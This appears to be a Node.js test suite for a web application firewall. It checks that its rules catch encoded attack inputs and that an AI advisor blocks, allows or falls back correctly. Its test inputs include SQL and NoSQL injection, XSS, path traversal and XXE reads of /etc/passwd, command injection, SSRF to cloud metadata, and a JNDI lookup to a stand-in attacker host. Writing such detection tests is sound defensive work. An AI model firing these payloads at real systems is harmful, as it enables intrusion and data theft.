import assert from "node:assert/strict";
import { calculateThreatScore } from "../utils/scoreCalculator.js";
import { canonicalizePayload, evaluateWafRules } from "../utils/wafRules.js";
import { makeAiDecision } from "../utils/decisionAdvisor.js";
import {
  createDashboardToken,
  verifyDashboardToken,
} from "../utils/dashboardAuth.js";
import {
  createRateLimiter,
  resetRateLimiterForTests,
} from "../middleware/rateLimiter.js";

const tests = [];

const test = (name, fn) => {
  tests.push({ name, fn });
};

test("score lets high-confidence deterministic rules dominate", () => {
  const score = calculateThreatScore({
    rules: 0.9,
    payload: 0,
    xss: 0.465,
    bot: 0,
    ddos: 0,
    behavior: 0,
  });

  assert.equal(score, 0.9);
});

test("score keeps clean traffic at zero", () => {
  assert.equal(calculateThreatScore({}), 0);
});

test("canonicalizes encoded payloads before rule evaluation", () => {
  assert.equal(
    canonicalizePayload("%253Cscript%253Ealert(1)%253C%252Fscript%253E"),
    "<script>alert(1)</script>",
  );
});

test("detects common SQL injection payloads", () => {
  const result = evaluateWafRules("' OR '1'='1' --");

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.category === "sqli"),
    true,
  );
  assert.ok(result.score >= 0.8);
});

test("detects encoded XSS payloads", () => {
  const result = evaluateWafRules("%3Cscript%3Ealert(1)%3C%2Fscript%3E");

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.category === "xss"),
    true,
  );
  assert.ok(result.score >= 0.9);
});

test("detects unicode-escaped XSS payloads", () => {
  const result = evaluateWafRules(
    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
  );

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.id === "xss-script-tag"),
    true,
  );
});

test("detects SQL injection with comments and time delay", () => {
  const result = evaluateWafRules(
    "id=1 UN/**/ION SEL/**/ECT password FROM users OR SLEEP(5)",
  );

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.category === "sqli"),
    true,
  );
  assert.ok(result.score >= 0.9);
});

test("does not flag ordinary payloads", () => {
  const result = evaluateWafRules("name=alice&action=view");

  assert.equal(result.matched, false);
  assert.equal(result.score, 0);
});

test("detects path traversal payloads", () => {
  const result = evaluateWafRules("file=../../../../etc/passwd");

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.category === "lfi"),
    true,
  );
});

test("detects command injection payloads", () => {
  const result = evaluateWafRules("name=test; cat /etc/passwd");

  assert.equal(result.matched, true);
  assert.equal(
    result.matches.some((match) => match.category === "rce"),
    true,
  );
});

test("detects SSRF metadata and localhost targets", () => {
  const metadata = evaluateWafRules(
    "url=http://169.254.169.254/latest/meta-data/",
  );
  const local = evaluateWafRules("url=http://127.0.0.1:8000/admin");

  assert.equal(
    metadata.matches.some((match) => match.id === "ssrf-cloud-metadata"),
    true,
  );
  assert.equal(
    local.matches.some((match) => match.id === "ssrf-localhost"),
    true,
  );
});

test("detects NoSQL, LDAP, template, and XXE payloads", () => {
  const nosql = evaluateWafRules(
    '{"username":{"$gt":""},"password":{"$ne":""}}',
  );
  const ldap = evaluateWafRules("admin)(|(password=*))");
  const template = evaluateWafRules("{{7*7}} ${jndi:ldap://attacker.test/a}");
  const xxe = evaluateWafRules(
    '<?xml version="1.0"?><!DOCTYPE x [<!ENTITY e SYSTEM "file:///etc/passwd">]><x>&e;</x>',
  );

  assert.equal(
    nosql.matches.some((match) => match.category === "nosqli"),
    true,
  );
  assert.equal(
    ldap.matches.some((match) => match.category === "ldap"),
    true,
  );
  assert.equal(
    template.matches.some((match) => match.category === "ssti"),
    true,
  );
  assert.equal(
    template.matches.some((match) => match.id === "jndi-lookup"),
    true,
  );
  assert.equal(
    xxe.matches.some((match) => match.category === "xxe"),
    true,
  );
});

test("detects header injection and open redirects", () => {
  const header = evaluateWafRules("name=guest%0D%0ASet-Cookie:%20admin=true");
  const redirect = evaluateWafRules("next=https://evil.example/login");

  assert.equal(
    header.matches.some((match) => match.category === "header-injection"),
    true,
  );
  assert.equal(
    redirect.matches.some((match) => match.category === "redirect"),
    true,
  );
});

test("returns explainable rule reasons", () => {
  const result = evaluateWafRules("<script>alert(1)</script>");

  assert.equal(Array.isArray(result.reasons), true);
  assert.equal(result.reasons.length > 0, true);
  assert.equal(typeof result.matches[0].reason, "string");
});

test("ai decision uses Groq response to block and explain why", async () => {
  const rules = evaluateWafRules("%27%20OR%20%271%27%3D%271%27%20--");
  const decision = await makeAiDecision({
    payload: "%27%20OR%20%271%27%3D%271%27%20--",
    ip: "192.168.1.100",
    scores: {
      rules: rules.score,
      payload: 0.001,
      xss: 0.465,
      bot: 0,
      ddos: 0,
      behavior: 0,
    },
    threatScore: calculateThreatScore({
      rules: rules.score,
      payload: 0.001,
      xss: 0.465,
    }),
    ruleMatches: rules.matches,
    policy: {
      blockThreshold: 0.75,
      alertThreshold: 0.5,
      overrideThreshold: 0.9,
    },
    groqDecision: async () => ({
      decision: "block",
      confidence: 0.96,
      primarySignal: "groq_sqli_analysis",
      reasons: ["SQL injection indicators were present in the payload."],
      override: null,
    }),
  });

  assert.equal(decision.decision, "block");
  assert.equal(decision.primarySignal, "groq_sqli_analysis");
  assert.equal(
    decision.reasons.some((reason) => reason.includes("SQL injection")),
    true,
  );
});

test("ai decision uses Groq response to allow clean low-score requests", async () => {
  const decision = await makeAiDecision({
    payload: "name=alice&action=view",
    ip: "192.168.1.100",
    scores: {
      rules: 0,
      payload: 0.05,
      xss: 0.02,
      bot: 0,
      ddos: 0,
      behavior: 0,
    },
    threatScore: 0.03,
    ruleMatches: [],
    policy: {
      blockThreshold: 0.75,
      alertThreshold: 0.5,
      overrideThreshold: 0.9,
    },
    groqDecision: async () => ({
      decision: "allow",
      confidence: 0.9,
      primarySignal: "groq_clean_request",
      reasons: ["Scores are low and the payload looks like normal form data."],
      override: null,
    }),
  });

  assert.equal(decision.decision, "allow");
  assert.equal(
    decision.reasons.some((reason) => reason.includes("normal form data")),
    true,
  );
});

test("ai decision falls back locally when Groq is rate limited", async () => {
  const decision = await makeAiDecision({
    payload: "name=alice&action=view",
    ip: "192.168.1.100",
    scores: {
      rules: 0.82,
      payload: 0.05,
      xss: 0.02,
      bot: 0,
      ddos: 0,
      behavior: 0,
    },
    threatScore: 0.82,
    ruleMatches: [],
    policy: {
      blockThreshold: 0.75,
      alertThreshold: 0.5,
      overrideThreshold: 0.9,
    },
    groqDecision: async () => {
      const error = new Error("Request failed with status code 429");
      error.response = { status: 429 };
      throw error;
    },
  });

  assert.equal(decision.decision, "block");
  assert.equal(decision.primarySignal, "local_fallback_high_threat");
  assert.equal(
    decision.reasons.some(
      (reason) =>
        reason.includes("429") || reason.includes("Groq decision failed"),
    ),
    false,
  );
});

test("dashboard tokens verify and preserve RBAC claims", () => {
  const token = createDashboardToken({
    username: "admin",
    role: "owner",
    tenantId: "tenant-a",
  });
  const claims = verifyDashboardToken(token);

  assert.equal(claims.sub, "admin");
  assert.equal(claims.role, "owner");
  assert.equal(claims.tenantId, "tenant-a");
});

test("dashboard token verification rejects tampering", () => {
  const token = createDashboardToken({
    username: "admin",
    role: "owner",
    tenantId: "tenant-a",
  });
  const tampered = token.replace(/.$/, token.endsWith("a") ? "b" : "a");

  assert.equal(verifyDashboardToken(tampered), null);
});

test("rate limiter blocks after configured threshold", () => {
  resetRateLimiterForTests();
  const limiter = createRateLimiter({
    max: 2,
    windowMs: 10000,
    keyPrefix: "test",
    keyGenerator: () => "client",
  });
  const req = {
    headers: {},
    ip: "127.0.0.1",
    baseUrl: "/api/test",
  };
  let statusCode = 200;
  const res = {
    setHeader() {},
    status(code) {
      statusCode = code;
      return this;
    },
    json(body) {
      this.body = body;
      return this;
    },
  };
  let nextCalls = 0;
  const next = () => {
    nextCalls += 1;
  };

  limiter(req, res, next);
  limiter(req, res, next);
  limiter(req, res, next);

  assert.equal(nextCalls, 2);
  assert.equal(statusCode, 429);
  assert.equal(res.body.error, "Rate limit exceeded");
});

let failed = 0;
(async () => {
  for (const item of tests) {
    try {
      await item.fn();
      console.log(`ok - ${item.name}`);
    } catch (error) {
      failed += 1;
      console.error(`not ok - ${item.name}`);
      console.error(error);
    }
  }

  if (failed > 0) {
    process.exitCode = 1;
  } else {
    console.log(`\n${tests.length} tests passed`);
  }
})();
